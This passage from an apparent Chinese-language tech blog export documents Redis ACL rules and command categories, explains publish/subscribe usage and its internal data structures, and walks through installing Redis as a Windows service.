</tr>
<tr>
<td>%W~<pattern></pattern></td>
<td>(版本<code>7.0</code>之后)  添加指定的写键模式。指定可以写入哪些键。<br>它的行为类似于常规键模式，但只授予写入匹配给定模式的键的权限。<br>有关更多信息，请参阅关键权限。</td>
</tr>
<tr>
<td>%RW~<pattern></pattern></td>
<td>(版本<code>7.0</code>之后) <code> ~&lt;pattern&gt;</code>另外一种书写形式</td>
</tr>
<tr>
<td>allkeys</td>
<td><code>~*</code>另外一种书写形式</td>
</tr>
<tr>
<td>resetkeys</td>
<td>刷新允许的键模式列表。 <br>例如<code>ACL ~foo:* ~bar:* resetkeys ~objects:*</code>，将只允许客户端访问匹配模式<code>objects:*</code>的键。</td>
</tr>
</tbody>
</table>
</li>
<li>
<p>允许和禁止发布/订阅频道:</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>&amp;<pattern></pattern></td>
<td>(版本<code>6.2</code>之后) 添加用户可以访问的 <code>Pub/Sub</code> 通道的全局样式模式。可以指定多个通道模式。<br>注意：模式匹配只对<code>PUBLISH</code>和<code>SUBSCRIBE</code>提到的通道进行, 而<code>PSUBSCRIBE</code>要求它的通道模式和用户允许的通道模式之间的文字匹配</td>
</tr>
<tr>
<td>allchannels</td>
<td><code>&amp;*</code>另外一种书写形式，允许用户访问所有Pub/Sub通道。</td>
</tr>
<tr>
<td>resetchannels</td>
<td>刷新允许的通道模式列表，如果用户的发布/订阅客户端不再能够访问各自的通道 和/或 通道模式，则断开这些客户端。</td>
</tr>
</tbody>
</table>
</li>
<li>
<p>为用户配置有效密码</p>
<p>如果一个用户没有标记为nopass，并且没有有效密码列表，那么该用户实际上是不可能使用的，因为无法以该用户身份登录</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>&gt;<password></password></td>
<td>将此密码添加到用户的有效密码列表中。例如，<code>&gt;mypass</code>会将<code>mypass</code>添加到有效密码列表中。<br>该指令清除<code>nopass</code>标志(参见后面的内容)。每个用户可以有任意数量的密码。</td>
</tr>
<tr>
<td>&lt;<password></password></td>
<td>从有效密码列表中删除此密码。如果您试图删除的密码实际上没有设置，则会发出一个错误。</td>
</tr>
<tr>
<td>#<hash></hash></td>
<td>将此SHA-256哈希值添加到用户的有效密码列表中。<br>此哈希值将与为ACL用户输入的密码的哈希值进行比较。这允许用户在acl.conf文件中存储哈希值，而不是存储明文密码。<br>只有SHA-256哈希值被接受，因为密码哈希值必须是64个字符，并且只包含小写的十六进制字符。</td>
</tr>
<tr>
<td>!<hash></hash></td>
<td>从有效密码列表中删除此散列值。<br>当您不知道由哈希值指定的密码，但希望从用户中删除密码时，这很有用。</td>
</tr>
<tr>
<td>nopass</td>
<td>该用户设置的所有密码都被删除，并且该用户被标记为不需要密码：这意味着每个密码都适用于该用户。<br>如果此指令用于默认用户<code>default</code>，则每个新连接将立即使用默认用户进行身份验证，而不需要任何显式的<code>AUTH</code>命令。<br>注意，resetpass 指令将清除此条件。</td>
</tr>
<tr>
<td>resetpass</td>
<td>清除允许的密码列表并删除<code>nopass</code>状态。<br>在<code>resetpass</code>之后，用户没有关联的密码，如果不添加一些密码（或者稍后将其设置为nopass）就无法进行身份验证。</td>
</tr>
</tbody>
</table>
</li>
<li>
<p>为用户配置选择器</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>(<rule list="">)</rule></td>
<td>(版本<code>7.0</code>之后) 创建一个新的选择器来匹配规则。<br>用括号中指定的选项创建一个新的选择器，并将其附加到用户。每个选项应该用空格隔开。第一个字符必须是<code>(</code>最后一个字符必须是<code>)</code><br>选择器在用户权限之后计算，并根据它们定义的顺序计算。如果一个命令匹配用户权限或任何选择器，它就被允许。<br>去 <a href="https://redis.io/docs/management/security/acl/#selectors">selectors</a> 查看更多信息</td>
</tr>
<tr>
<td>clearselectors</td>
<td>(版本<code>7.0</code>之后) 删除所有附加到用户的选择器</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody>
</table>
</li>
<li>
<p>重置用户:</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>reset</td>
<td>执行以下操作:<code>resetpass, resetkeys, resetchannels, allchannels(如果设置了acl-pubsub-default)， off, clearselectors， -@all</code><br>用户将返回到创建后立即具有的相同状态。</td>
</tr>
</tbody>
</table>
</li>
</ul>
<h1>命令分类</h1>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>admin</td>
<td>管理命令。普通应用程序永远不需要使用这些. <br>Includes REPLICAOF, CONFIG, DEBUG, SAVE, MONITOR, ACL, SHUTDOWN, etc.</td>
</tr>
<tr>
<td>blocking</td>
<td>可能阻塞连接，直到另一个命令释放</td>
</tr>
<tr>
<td>connection</td>
<td>影响连接或其他连接的命令. 包含 AUTH, SELECT, COMMAND, CLIENT, ECHO, PING, 等</td>
</tr>
<tr>
<td>dangerous</td>
<td>有潜在危险(由于各种原因，每一种都应谨慎考虑). 包含 FLUSHALL, MIGRATE, RESTORE, SORT, KEYS, CLIENT, DEBUG, INFO, CONFIG, SAVE, REPLICAOF, 等</td>
</tr>
<tr>
<td>fast</td>
<td>Fast O(1) 命令. 可以循环参数的数量，但不是键中的元素数量。</td>
</tr>
<tr>
<td>keyspace</td>
<td>以类型不可知的方式从键、数据库或其元数据中写入或读取。包括DEL, RESTORE, DUMP, RENAME, EXISTS, DBSIZE, KEYS, EXPIRE, TTL, FLUSHALL等。<br>可能修改键空间、键或元数据的命令也将有<code>写</code>类别<br>只读取键空间、键或元数据的命令将具有<code>read</code>类别</td>
</tr>
<tr>
<td>pubsub</td>
<td>PubSub相关命令</td>
</tr>
<tr>
<td>read</td>
<td>从键(值或元数据)读取。注意，不与键交互的命令既不能读也不能写。</td>
</tr>
<tr>
<td>scripting</td>
<td>Scripting相关命令</td>
</tr>
<tr>
<td>slow</td>
<td>所有不是快速的命令.</td>
</tr>
<tr>
<td>transaction</td>
<td>WATCH / MULTI / EXEC 相关命令</td>
</tr>
<tr>
<td>write</td>
<td>写入键(值或元数据)。</td>
</tr>
<tr>
<td>bitmap</td>
<td>Data type: bitmaps related.</td>
</tr>
<tr>
<td>set</td>
<td>Data type: sets related.</td>
</tr>
<tr>
<td>sortedset</td>
<td>Data type: sorted sets related.</td>
</tr>
<tr>
<td>geo</td>
<td>Data type: geospatial indexes related.</td>
</tr>
<tr>
<td>hash</td>
<td>Data type: hashes related.</td>
</tr>
<tr>
<td>hyperloglog</td>
<td>Data type: hyperloglog related.</td>
</tr>
<tr>
<td>stream</td>
<td>Data type: streams related.</td>
</tr>
<tr>
<td>string</td>
<td>Data type: strings related.</td>
</tr>
<tr>
<td>list</td>
<td>Data type: lists related.</td>
</tr>
</tbody>
</table>
<p>有关ACL配置的更多信息，请参见 <a href="https://redis.io/topics/acl">https://redis.io/topics/acl</a></p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis-发布订阅</title>
    <url>/20221102/4cdb4706.html</url>
    <content><![CDATA[<h1>Redis  发布订阅简介</h1>
<blockquote>
<p>Redis 发布订阅(pub/sub)是一种消息通信模式：发送者(pub)发送消息，订阅者(sub)接收消息。</p>
</blockquote>
<p>Redis 的 SUBSCRIBE 命令可以让客户端订阅任意数量的频道， 每当有新信息发送到被订阅的频道时， 信息就会被发送给所有订阅指定频道的客户端。</p>
<p>作为例子， 下图展示了频道 channel1 ， 以及订阅这个频道的三个客户端 —— client2 、 client5 和 client1 之间的关系：</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/db-redis-sub-1.svg" alt="img"></p>
<p>当有新消息通过 PUBLISH 命令发送给频道 channel1 时， 这个消息就会被发送给订阅它的三个客户端：</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/db-redis-sub-2.svg" alt="img"></p>
<h2 id="发布-订阅使用">发布/订阅使用</h2>
<blockquote>
<p>Redis有两种发布/订阅模式：</p>
<ul>
<li>基于频道(Channel)的发布/订阅</li>
<li>基于模式(pattern)的发布/订阅</li>
</ul>
</blockquote>
<h3 id="基于频道-Channel-的发布-订阅">基于频道(Channel)的发布/订阅</h3>
<p>"发布/订阅"模式包含两种角色，分别是发布者和订阅者。发布者可以向指定的频道(channel)发送消息; 订阅者可以订阅一个或者多个频道(channel),所有订阅此频道的订阅者都会收到此消息。</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/db-redis-sub-8.png" alt="img"></p>
<ul>
<li>
<p><strong>发布者发布消息</strong></p>
<p>发布者发布消息的命令是 <code>publish</code>,用法是<code> publish channel message</code>，如向 channel1.1说一声hi</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>&gt;</span> publish channel:1 hi
<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>这样消息就发出去了。返回值表示接收这条消息的订阅者数量。发出去的消息不会被持久化，也就是有客户端订阅channel:1后只能接收到后续发布到该频道的消息，之前的就接收不到了。</p>
</li>
<li>
<p><strong>订阅者订阅频道</strong></p>
<p>订阅频道的命令是 <code>subscribe</code>，可以同时订阅多个频道，用法是 <code>subscribe channel1 [channel2 ...]</code>,例如新开一个客户端订阅上面频道:(不会收到消息，因为不会收到订阅之前就发布到该频道的消息)</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>&gt;</span> subscribe channel:1
Reading messages<span class="token punctuation">..</span>. <span class="token punctuation">(</span>press Ctrl-C to quit<span class="token punctuation">)</span>
<span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"subscribe"</span> // 消息类型
<span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"channel:1"</span> // 频道
<span class="token number">3</span><span class="token punctuation">)</span> <span class="token string">"hi"</span> // 消息内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>执行上面命令客户端会进入订阅状态，处于此状态下客户端不能使用除<code>subscribe</code>、<code>unsubscribe</code>、<code>psubscribe</code>和<code>punsubscribe</code>这四个属于"发布/订阅"之外的命令，否则会报错。</p>
<p>进入订阅状态后客户端可能收到3种类型的回复。每种类型的回复都包含3个值，第一个值是消息的类型，根据消类型的不同，第二个和第三个参数的含义可能不同。</p>
<p>消息类型的取值可能是以下3个:</p>
<ul>
<li><strong>subscribe</strong>。表示订阅成功的反馈信息。第二个值是订阅成功的频道名称，第三个是当前客户端订阅的频道数量。</li>
<li><strong>message</strong>。表示接收到的消息，第二个值表示产生消息的频道名称，第三个值是消息的内容。</li>
<li><strong>unsubscribe</strong>。表示成功取消订阅某个频道。第二个值是对应的频道名称，第三个值是当前客户端订阅的频道数量，当此值为0时客户端会退出订阅状态，之后就可以执行其他非"发布/订阅"模式的命令了。</li>
</ul>
<table>
<thead>
<tr>
<th><strong>消息发布者</strong></th>
<th><strong>订阅者A</strong></th>
<th><strong>订阅者B</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>&gt; PUBLISH channel:a hi <br>(integer) 0</td>
<td>&gt; SUBSCRIBE channel:a channel:b <br>1) “subscribe” <br>2) “channel:a”<br> 3) (integer) 1 <br>1) “subscribe” <br>2) “channel:b” <br>3) (integer) 2</td>
<td>&gt; SUBSCRIBE channel:b channel:c <br>1) “subscribe” <br>2) “channel:b” <br>3) (integer) 1 <br>1) “subscribe” <br>2) “channel:c” <br>3) (integer) 2</td>
</tr>
<tr>
<td>&gt; PUBLISH channel:a hi <br>(integer) 1</td>
<td>1) “message” <br>2) “channel:a” <br>3) “hi”</td>
<td></td>
</tr>
<tr>
<td>&gt; PUBLISH channel:b hello <br>(integer) 2</td>
<td>1) “message” <br>2) “channel:b” <br>3) “hello”</td>
<td>1) “message”<br>2) “channel:b”<br>3) “hello”</td>
</tr>
<tr>
<td>&gt; PUBLISH channel:c lalalala <br>(integer) 1</td>
<td></td>
<td>1) “message”<br>2) “channel:c” <br>3) “lalalala”</td>
</tr>
</tbody>
</table>
</li>
</ul>
<h3 id="基于模式-pattern-的发布-订阅">基于模式(pattern)的发布/订阅</h3>
<p>如果有某个/某些模式和这个频道匹配的话，那么所有订阅这个/这些频道的客户端也同样会收到信息。</p>
<ul>
<li>
<p><strong>用图例解释什么是基于模式的发布订阅</strong></p>
<p>下图展示了一个带有频道和模式的例子， 其中 <code>tweet.shop.*</code> 模式匹配了 <code>tweet.shop.kindle</code> 频道和 <code>tweet.shop.ipad</code> 频道， 并且有不同的客户端分别订阅它们三个：</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/db-redis-sub-5.svg" alt="img"></p>
<p>当有信息发送到<code> tweet.shop.kindle</code> 频道时， 信息除了发送给 clientX 和 clientY 之外， 还会发送给订阅<code>tweet.shop.*</code>模式的 client123 和 client256 ：</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/db-redis-sub-6.svg" alt="img"></p>
<p>另一方面， 如果接收到信息的是频道 <code>tweet.shop.ipad</code> ， 那么 client123 和 client256 同样会收到信息：</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/db-redis-sub-7.svg" alt="img"></p>
</li>
<li>
<p><strong>基于模式的例子</strong></p>
<p>通配符中<code>?</code>表示1个占位符，<code>*</code>表示任意个占位符(包括0)，<code>?*</code>表示1个以上占位符。</p>
<table>
<thead>
<tr>
<th></th>
<th><strong>消息发布者</strong></th>
<th><strong>订阅者A</strong></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>准备</td>
<td></td>
<td>&gt; <strong>psubscribe a? b* d?*</strong> <br>1) “psubscribe”  <br>2) “a?”  <br>3) (integer) 1  <br>1) “psubscribe”  <br>2) “b” 3) (integer) 2  <br>1) “psubscribe”  <br>2) “d?”  <br>3) (integer) 3 <br></td>
<td>&gt; <strong>psubscribe c? b* d?*</strong> <br>“psubscribe”  <br>2) “c?”  <br>3) (integer) 1  <br>1) “psubscribe”  <br>2) “b” 3) (integer) 2  <br>1) “psubscribe”  <br>2) “d?”  <br>3) (integer) 3</td>
</tr>
<tr>
<td>发送消息</td>
<td>&gt; publish a m1<br> (integer) 0</td>
<td></td>
<td></td>
</tr>
<tr>
<td>发送消息</td>
<td>&gt; publish a1 m1<br> (integer) 1</td>
<td>1) “pmessage”<br>2) “a?”<br>3) “a1”<br>4) “m1”</td>
<td></td>
</tr>
<tr>
<td>发送消息</td>
<td>&gt; publish a11 m1 <br>(integer) 0</td>
<td></td>
<td></td>
</tr>
<tr>
<td>发送消息</td>
<td>&gt; publish b abc <br>(integer) 2</td>
<td>1) “pmessage” <br>2) “b*” <br>3) “b” <br>4) “abc”</td>
<td>1) “pmessage” <br>2) “b*” <br>3) “b” <br>4) “abc”</td>
</tr>
<tr>
<td>发送消息</td>
<td>&gt; publish c abc<br> (integer) 0</td>
<td></td>
<td></td>
</tr>
<tr>
<td>发送消息</td>
<td>&gt; publish c1 m1<br> (integer) 1</td>
<td></td>
<td>1) “pmessage” <br>2) “c?” <br>3) “c1” <br>4) “m1”</td>
</tr>
<tr>
<td>发送消息</td>
<td>&gt; publish c11 m1 <br>(integer) 0</td>
<td></td>
<td></td>
</tr>
<tr>
<td>发送消息</td>
<td>&gt; publish d m1 <br>(integer) 0</td>
<td></td>
<td></td>
</tr>
<tr>
<td>发送消息</td>
<td>&gt; publish d1 m1 <br>(integer) 2</td>
<td>1) “pmessage” <br>2) “d?*” <br>3) “d1” <br>4) “m1”</td>
<td>1) “pmessage” <br>2) “d?*” <br>3) “d1” <br>4) “m1”</td>
</tr>
<tr>
<td>发送消息</td>
<td>&gt; publish d11 m1<br> (integer) 2</td>
<td>1) “pmessage” <br>2) “d?*” <br>3) “d11” <br>4) “m1”</td>
<td>1) “pmessage” <br>2) “d?*” <br>3) “d11” <br>4) “m1”</td>
</tr>
</tbody>
</table>
</li>
<li>
<p><strong>注意点</strong></p>
</li>
</ul>
<ol>
<li>
<p>使用<code>psubscribe</code>命令可以重复订阅同一个频道，如客户端执行了<code>psubscribe c? c?*</code>。这时向c1发布消息客户端会接受到两条消息，而同时<code>publish</code>命令的返回值是2而不是1。同样的，如果有另一个客户端执行了<code>subscribe c1</code> 和<code>psubscribe c?*</code>的话，向c1发送一条消息该客户顿也会受到两条消息(但是是两种类型:message和pmessage)，同时<code>publish</code>命令也返回2.</p>
</li>
<li>
<p><code>punsubscribe</code>命令可以退订指定的规则，用法是: <code>punsubscribe [pattern [pattern ...]]</code>,如果没有参数则会退订所有规则。</p>
</li>
<li>
<p>使用<code>punsubscribe</code>只能退订通过psubscribe命令订阅的规则，不会影响直接通过<code>subscribe</code>命令订阅的频道；同样<code>unsubscribe</code>命令也不会影响通过<code>psubscribe</code>命令订阅的规则。另外需要注意<code>punsubscribe</code>命令退订某个规则时不会将其中的通配符展开，而是进行严格的字符串匹配，所以<code>punsubscribe *</code> 无法退订<code>c*</code>规则，而是必须使用<code>punsubscribe c*</code>才可以退订。（它们是相互独立的，后文可以看到数据结构上看也是两种实现）</p>
</li>
</ol>
<h2 id="深入理解">深入理解</h2>
<blockquote>
<p>我们通过几个问题，来深入理解Redis的订阅发布机制</p>
</blockquote>
<h3 id="基于频道-Channel-的发布-订阅如何实现的？">基于频道(Channel)的发布/订阅如何实现的？</h3>
<p>底层是通过字典（图中的pubsub_channels）实现的，这个字典就用于保存订阅频道的信息：字典的键为正在被订阅的频道， 而字典的值则是一个链表， 链表中保存了所有订阅这个频道的客户端。</p>
<ul>
<li>
<p><strong>数据结构</strong></p>
<p>比如说，在下图展示的这个 pubsub_channels 示例中， client2 、 client5 和 client1 就订阅了 channel1 ， 而其他频道也分别被别的客户端所订阅：</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/db-redis-sub-3.svg" alt="img"></p>
</li>
<li>
<p><strong>订阅</strong></p>
<p>当客户端调用 SUBSCRIBE 命令时， 程序就将客户端和要订阅的频道在 pubsub_channels 字典中关联起来。</p>
<p>举个例子，如果客户端 client10086 执行命令 <code>SUBSCRIBE channel1 channel2 channel3</code> ，那么前面展示的 pubsub_channels 将变成下面这个样子：</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/db-redis-sub-4.svg" alt="img"></p>
</li>
<li>
<p><strong>发布</strong></p>
<p>当调用 <code>PUBLISH channel message</code> 命令， 程序首先根据 channel 定位到字典的键， 然后将信息发送给字典值链表中的所有客户端。</p>
<p>比如说，对于以下这个 pubsub_channels 实例， 如果某个客户端执行命令 <code>PUBLISH channel1 "hello moto"</code> ，那么 client2 、 client5 和 client1 三个客户端都将接收到 “hello moto” 信息：</p>
</li>
<li>
<p><strong>退订</strong></p>
<p>使用 UNSUBSCRIBE 命令可以退订指定的频道， 这个命令执行的是订阅的反操作： 它从 <code>pubsub_channels </code>字典的给定频道（键）中， 删除关于当前客户端的信息， 这样被退订频道的信息就不会再发送给这个客户端。</p>
</li>
</ul>
<h3 id="基于模式-Pattern-的发布-订阅如何实现的？">基于模式(Pattern)的发布/订阅如何实现的？</h3>
<p>底层是pubsubPattern节点的链表。</p>
<ul>
<li>
<p><strong>数据结构</strong></p>
<p>redisServer.pubsub_patterns 属性是一个链表，链表中保存着所有和模式相关的信息：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">redisServer</span> <span class="token punctuation">{</span>
    <span class="token comment">// ...</span>
    list <span class="token operator">*</span>pubsub_patterns<span class="token punctuation">;</span>
    <span class="token comment">// ...</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>链表中的每个节点都包含一个 redis.h/pubsubPattern 结构：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">pubsubPattern</span> <span class="token punctuation">{</span>
    redisClient <span class="token operator">*</span>client<span class="token punctuation">;</span>
    robj <span class="token operator">*</span>pattern<span class="token punctuation">;</span>
<span class="token punctuation">}</span> pubsubPattern<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>client 属性保存着订阅模式的客户端，而 pattern 属性则保存着被订阅的模式。</p>
<p>每当调用 PSUBSCRIBE 命令订阅一个模式时， 程序就创建一个包含客户端信息和被订阅模式的 pubsubPattern 结构， 并将该结构添加到 redisServer.pubsub_patterns 链表中。</p>
<p>作为例子，下图展示了一个包含两个模式的 pubsub_patterns 链表， 其中 client123 和 client256 都正在订阅 <a href="http://tweet.shop">tweet.shop</a>.* 模式：</p>
<p>!</p>
<p>](<a href="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/db-redis-sub-9.svg">https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/db-redis-sub-9.svg</a>)</p>
</li>
<li>
<p><strong>订阅</strong></p>
<p>如果这时客户端 client10086 执行 <code>PSUBSCRIBE broadcast.list.*</code> ， 那么 pubsub_patterns 链表将被更新成这样：</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/db-redis-sub-10.svg" alt="img"></p>
<p>通过遍历整个 pubsub_patterns 链表，程序可以检查所有正在被订阅的模式，以及订阅这些模式的客户端。</p>
</li>
<li>
<p><strong>发布</strong></p>
<p>发送信息到模式的工作也是由 PUBLISH 命令进行的, 显然就是匹配模式获得Channels，然后再把消息发给客户端。</p>
</li>
<li>
<p><strong>退订</strong></p>
<p>使用 PUNSUBSCRIBE 命令可以退订指定的模式， 这个命令执行的是订阅模式的反操作： 程序会删除 redisServer.pubsub_patterns 链表中， 所有和被退订模式相关联的 pubsubPattern 结构， 这样客户端就不会再收到和模式相匹配的频道发来的信息。</p>
</li>
</ul>
<h2 id="SpringBoot结合Redis发布-订阅实例？">SpringBoot结合Redis发布/订阅实例？</h2>
<p>参考：<a href="https://blog.csdn.net/llll234/article/details/80966952">https://blog.csdn.net/llll234/article/details/80966952</a></p>
<p>最佳实践是通过RedisTemplate，关键代码如下：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 发布</span>
redisTemplate<span class="token punctuation">.</span><span class="token function">convertAndSend</span><span class="token punctuation">(</span><span class="token string">"my_topic_name"</span><span class="token punctuation">,</span> <span class="token string">"message_content"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 配置订阅</span>
<span class="token class-name">RedisMessageListenerContainer</span> container <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RedisMessageListenerContainer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
container<span class="token punctuation">.</span><span class="token function">setConnectionFactory</span><span class="token punctuation">(</span>connectionFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>
container<span class="token punctuation">.</span><span class="token function">addMessageListener</span><span class="token punctuation">(</span>xxxMessageListenerAdapter<span class="token punctuation">,</span> <span class="token string">"my_topic_name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<hr>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis-命令记录</title>
    <url>/20221103/709af9d4.html</url>
    <content><![CDATA[<h1>KEY的命名</h1>
<p>用<code>:</code>分隔不同的层次命名空间，如：<code>user:id12345:contact</code></p>
<p>如果某个对象有<code>字段的字段</code>，用<code>.</code>连接。如<code>user:id12345:contact.mail</code>。</p>
<h1>基础命令记录</h1>
<table>
<thead>
<tr>
<th style="text-align:left">命令</th>
<th style="text-align:left">使用</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">SWAPDB</td>
<td style="text-align:left"><span id="Order_SWAPDB"><strong>SWAPDB</strong> index1 index2 </span></td>
<td>库index1 和 库index2的数据交换</td>
</tr>
<tr>
<td style="text-align:left">EXISTS</td>
<td style="text-align:left"><span id="Order_EXISTS"><strong>EXISTS</strong> key</span></td>
<td>判断key是否存在</td>
</tr>
<tr>
<td style="text-align:left">TTL</td>
<td style="text-align:left"><span id="Order_TTL"><strong>TTL</strong> key</span></td>
<td>查询key的过期时间</td>
</tr>
<tr>
<td style="text-align:left">EXPIRE</td>
<td style="text-align:left"><span id="Order_EXPIRE"><strong>EXPIRE</strong> key seconds  /  <strong>EXPIREAT</strong> key timestamp</span></td>
<td></td>
</tr>
</tbody>
</table>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis安装</title>
    <url>/20221102/c9f6f059.html</url>
    <content><![CDATA[<h1>单机安装：Windows</h1>
<p>Redis 是一个开源（BSD许可）的，内存中的数据结构存储系统，它可以用作数据库、缓存和消息中间件。</p>
<h2 id="下载地址：">下载地址：</h2>
<pre class="line-numbers language-none"><code class="language-none">windows版本： https://github.com/MSOpenTech/redis/releases
Linux版本：官网下载： http://www.redis.cn/
git下载：https://github.com/antirez/redis/releases<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>我们现在讨论的是windows下的安装部署，目前windows下最新版本是：3.2.100。下载地址，提供多种下载内容，</p>
 <pre class="line-numbers language-none"><code class="language-none">Redis-x64-3.2.100.msi是在windows下，最简单的安装文件，方便，直接会将Redis写入windows服务。
Redis-x64-3.2.100.zip是需要解压安装的，接下来讨论的是这种。
Source code (zip) 源码的zip压缩版
Source code (tar.gz) 源码的tar.gz压缩版 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image002-16383227748541.png" alt="8cc0c90bc2b723d9f6cdc3a1356559b9.png"></p>
<h2 id="安装">安装</h2>
<p>解压安装将下载的Redis-x64-3.2.100.zip 解压到某个地址。</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image004-16383227748552.png" alt="5bfe10debe216c18d70d3d0e555be8ae.png"></p>
<p>启动命令通过cmd指定到该redis目录。<br>
使用命令：<code>redis-server.exe </code>启动服务</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image005-16383227748554.png" alt="263f236f685ad552e15c64422eda72d6.png"></p>
<p>出现这种效果，表明启动服务成功。启动另一个cmd，在该redis目录下，使用命令：redis-cli.exe 启动客户端,连接服务器</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image006-16383227748553.png" alt="ff00ad0320f2dbe6e8d3a50aa8e8b1a8.png"></p>
<p>出现这种效果，表明启动客户度成功。</p>
<h2 id="部署">部署</h2>
<p>由于上面虽然启动了redis服务，但是，只要一关闭cmd窗口，redis服务就关闭了。所以，把redis设置为一个windows服务。</p>
<p>安装之前，windows服务是不包含redis服务的</p>
<p>安装为windows服务安装命令:</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image008-16383227748555.png" alt="95da60801d83c5caf9c8286ecab1574f.png"></p>
<pre class="line-numbers language-none"><code class="language-none">redis-server.exe --service-install redis.windows.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>使用命令，安装成功，如图所示</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image009.png" alt="cf536a1024ae8ece56703496ca29dbff.png"></p>
<p>最后的参数<code> --loglevel verbose</code>表示记录日志等级</p>
<p>安装之后，windows目前的服务列表</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image011.png" alt="ad9747b797fe689579ca4642902afe49.png"></p>
<p>常用的redis服务命令。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">卸载服务：redis-server --service-uninstall
开启服务：redis-server --service-start
停止服务：redis-server --service-stop
重命名服务：redis-server --service-name name<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>重命名服务，需要写在前三个参数之后</p>
<p>例如： The following would install and start three separate instances of Redis as a service:</p>
<p>以下将会安装并启动三个不同的Redis实例作服务：</p>
<pre class="line-numbers language-none"><code class="language-none">redis-server --service-install --service-name redisService1 --port 10001
redis-server --service-start --service-name redisService1

redis-server --service-install --service-name redisService2 --port 10002
redis-server --service-start --service-name redisService2

redis-server --service-install --service-name redisService3 --port 10003
redis-server --service-start --service-name redisService3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>四：测试启动服务</p>
<p>客户端命令</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">redis-server --service-start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>精简模式</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">redis-cli.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>指定模式</p>
